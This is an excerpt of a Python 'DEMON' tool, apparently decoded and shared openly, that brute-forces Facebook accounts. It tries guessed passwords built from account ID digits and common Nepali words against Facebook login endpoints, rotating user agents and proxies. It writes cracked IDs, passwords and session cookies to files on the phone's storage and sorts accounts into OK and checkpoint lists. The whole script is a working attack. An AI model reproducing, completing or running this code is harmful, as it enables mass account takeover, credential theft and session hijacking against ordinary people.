# --< Decoded By 1nOnly Roheet -!
# --< OPEN SOURCES BY RIZZYYYYY--!
...
greeting = 'GOOD NIGHT\t   :'
logo = '\x1b[38;5;82m██████  ███████ ███    ███  ██████  ███    ██ \n\x1b[38;5;83m██   ██ ██      ████  ████ ██    ██ ████   ██ \n\x1b[38;5;84m██   ██ █████   ██ ████ ██ ██    ██ ██ ██  ██ \n\x1b[38;5;85m██   ██ ██      ██  ██  ██ ██    ██ ██  ██ ██ \n\x1b[38;5;86m██████  ███████ ██      ██  ██████  ██   ████ \x1b[38;5;124m[\x1b[38;5;119mV\x1b[38;5;20m~\x1b[38;5;14m2.0\x1b[38;5;124m]\n\x1b[91m\x1b[1;37m-------------------------------------------'

def info():
    print('TOOL TYPE\x1b[91m•-> \x1b[1;37mFILExPUBLIC')
    print('MENTORS\x1b[91m•-> \x1b[1;37mPRABESHxBISHESH')
    print('VERSION\x1b[91m•-> \x1b[1;37m2.0')
    print('STATUS\x1b[91m•-> \x1b[1;37mFREE')
    print('\x1b[91m\x1b[1;37m-------------------------------------------')
...
uname = input('\x1b[91m•-> \x1b[91m\x1b[1;37m WHAT IS YOUR NAME \x1b[38;5;196m: \x1b[1;37m')
...
def login123():
    ...
    banner()
    info()
    print('\x1b[91m•-> \x1b[91m\x1b[1;37m ' + greeting, uname)
    print('\x1b[91m•-> \x1b[91m\x1b[1;37m TODAY FIX DATE  : ' + date)
    print('\x1b[91m•-> \x1b[91m\x1b[1;37m YOUR IP ADDRESS : ' + ip)
    print('\x1b[91m•-> \x1b[91m\x1b[1;37m YOUR DATA/WIFI  : ' + sim)
    linex()
...
def setting():
    ...
    method.append('mobile')
    linex()
    _____cowok__pink_____ = input('\x1b[91m•-> \x1b[91m\x1b[1;37m) DO YOU WANT TO SHOW CP (y/n) : ')
    if _____cowok__pink_____ in ('y', 'Y', '1'):
        akun.append('y')
    akun.append('n')
    linex()
    xxx = input('\x1b[91m•->\x1b[91m\x1b[1;37m) DO YOU WANT TO SHOW CREATION DATE (y/n) : ')
    if xxx in ('y', 'Y'):
        apk_ck.append('y')
    apk_ck.append('n')
    passwrd()
...
def passwrd():
    ...
    print(logo)
    linex()
    print('\x1b[91m•-> \x1b[91m\x1b[1;37m\x1b[37m TOTAL ACCOUNT :\x1b[38;5;196m', str(len(id)))
    print('\x1b[91m•-> \x1b[91m\x1b[1;37m TODAYS DATE   : ' + date)
    linex()
    print('\x1b[38;5;196m-->> \x1b[1;37mOK ID SAVED IN /sdcard/DEMON-DON-OK.txt \x1b[1;37m')
    print('\x1b[38;5;196m-->> \x1b[1;37mCP ID SAVED IN \x1b[33m/sdcard/DEMON-DON-CP.txt \x1b[1;37m')
    linex()
...
def crack(idf, pwv):
    ...
    sys.stdout.write(f'''\r\x1b[37m[DEMON-RUNNING] {loop}/{len(id)} OK[\x1b[38;5;46m{ok}\x1b[37m] [{'{:.0%}'.format(loop / float(len(id)))}]''')
    sys.stdout.flush()
    ...
    for pw in pwv:
        ...
        try:
            ...
            if 'c_user' in ses.cookies.get_dict().keys():
                ...
                print(f'''\r{bo} [\x1b[1;37mDEMON-ALIVE\x1b[1;32m\x1b[1;37m] {idf} \x1b[91m•->\x1b[1;37m{pw} \x1b[91m•->\x1b[1;37m {kuki}''')
                with open('OK/' + okc, 'a') as f:
                    f.write(f'{idf}|{pw}|{kuki}\n')
                with open('/sdcard/DEMON-DON-OK.txt', 'a') as f:
                    f.write(f'{idf} | {pw} | {kuki}\n')
            
            elif 'checkpoint' in po.cookies.get_dict().keys():
                print(f'''\r{bo}[DEMON-DON-{idf}] {idf}|{pw}''')
                with open('CP/' + cpc, 'a') as f:
                    f.write(f'{idf}|{pw}\n')
                with open('/sdcard/DEMON-DON-CP.txt', 'a') as f:
                    f.write(f'{idf} | {pw}\n')
...
def crackfree(idf, pwv):
    global cp, ok, loop
    sys.stdout.write(f'''\r\x1b[37m[DEMON-DON] {loop}/{len(id)} OK[\x1b[38;5;46m{ok}\x1b[37m] [{'{:.0%}'.format(loop / float(len(id)))}]''')
    sys.stdout.flush()
    ua = random.choice(ugen)
    ses = requests.Session()
    ...
    for pw in pwv:
        ...
        p = ses.get('https://free.facebook.com/login/device-based/validate-password/?shbl=0', allow_redirects=False, proxies=proxs)
        ...
        if 'checkpoint' in po.cookies.get_dict().keys():
            print(f'''\r\x1b[31m[DEMON-DON-CP] {idf} │ {pw}''')
            with open('CP/' + cpc, 'a') as f:
                f.write(f'{idf}|{pw}\n')
            with open('/sdcard/DEMON-DON-CP.txt', 'a') as f:
                f.write(f'{idf} | {pw}\n')
            ...
            coki = po.cookies.get_dict()
            kuki = '; '.join([f'{key}={value}' for key, value in ses.cookies.get_dict().items()])
            print(f'''\r\x1b[32m[DEMON-DON-OK] {idf} │ {pw}''')
            with open('OK/' + okc, 'a') as f:
                f.write(f'{idf}|{pw}\n')
            with open('/sdcard/DEMON-DON-OK.txt', 'a') as f:
                f.write(f'{idf} | {pw} | {kuki}\n')
...
def RandomCloning():
    ...
    banner()
    linex()
    print(f'\x1b[37m[+] TOTAL ID : \x1b[32m{len(bou)}')
    ...
    for love in bou:
        ids = code + love
        passlist = [
            ids[:6], ids[:7], ids[:8], love,
            ids[2:], ids[3:], 'nepal123', 'nepal1234',
            'nepal12345', 'nepal@123', 'maya123',
            'kathmandu', 'pokhara', 'tamang',
            'tamang123', 'iloveyou'
        ]
...
def cracker(ids, passlist):
    global ok, cp, loop
    sys.stdout.write(f'\r\r\x1b[37m[DEMON-DON] {loop}|RANDOM \x1b[38;5;46m[OK-:{ok}]')
    sys.stdout.flush()
    ...
    for pas in passlist:
        ...
        try:
            ...
            if 'access_token' in po:
                ...
                coki = f'sb={ssbb};{ckkk}'
                print(f'\r\r\x1b[38;5;46m[DEMON-DON-OK] {uid} | {pas}')
                if 'y' in apk:
                    print(f'\r\r[COOKIE] {coki}')
                    check_apk(coki)
                with open('/sdcard/DEMON-DON-RNDM-OK.txt', 'a') as f:
